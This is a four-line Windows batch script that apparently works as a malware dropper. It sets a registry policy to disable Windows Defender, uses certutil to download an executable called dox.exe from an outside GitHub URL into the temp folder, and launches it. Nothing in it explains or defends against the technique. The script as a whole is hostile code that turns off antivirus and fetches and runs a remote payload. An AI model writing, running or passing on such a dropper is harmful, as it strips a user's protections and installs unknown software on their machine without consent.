@echo off
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
certutil -urlcache -f https://raw.githubusercontent.com/dekofail/file/main/dox.exe %temp%\dox.exe
start %temp%\dox.exe